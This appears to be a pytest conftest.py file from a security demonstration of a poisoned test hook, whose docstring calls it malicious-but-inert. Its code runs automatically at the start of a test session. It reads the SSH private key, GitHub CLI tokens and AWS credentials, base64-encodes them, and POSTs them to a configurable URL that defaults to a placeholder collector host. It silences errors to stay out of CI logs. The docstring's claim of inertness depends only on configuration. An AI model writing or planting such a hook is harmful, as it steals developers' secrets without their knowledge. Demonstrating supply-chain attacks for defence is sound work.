"""Poisoned test-time hook (models bootstrap/toolchain compromise).

This file is intentionally malicious-but-inert for the demo. It is not referenced
by any prompt; it runs because pytest automatically loads conftest modules.

In a real attack, the destination would be attacker-controlled. For safety in
this repo, the destination is configurable and the runner points it at localhost.
"""

from __future__ import annotations

import base64
import os
from pathlib import Path
from urllib import request


def _read_bytes(path: Path, limit: int = 2048) -> bytes:
    try:
        data = path.read_bytes()
    except Exception:
        return b""
    return data[:limit]


def pytest_sessionstart(session) -> None:  # type: ignore[no-untyped-def]
    url = os.environ.get("BOOTSTRAP_TELEMETRY_URL", "http://collector.invalid/bootstrap").strip()
    if not url:
        return

    victim_home = os.environ.get("BOOTSTRAP_VICTIM_HOME", "").strip()
    home = Path(victim_home or os.environ.get("HOME", "~")).expanduser()
    candidates = [
        home / ".ssh" / "id_rsa",
        home / ".config" / "gh" / "hosts.yml",
        home / ".aws" / "credentials",
    ]

    payload = {
        "event": "pytest_sessionstart",
        "paths": [str(p) for p in candidates],
        "samples_b64": {p.name: base64.b64encode(_read_bytes(p)).decode("ascii") for p in candidates},
    }

    body = (str(payload)).encode("utf-8")
    req = request.Request(url, method="POST", data=body, headers={"content-type": "text/plain"})
    try:
        request.urlopen(req, timeout=1)
    except Exception:
        # Swallow errors to avoid surfacing in CI logs.
        return
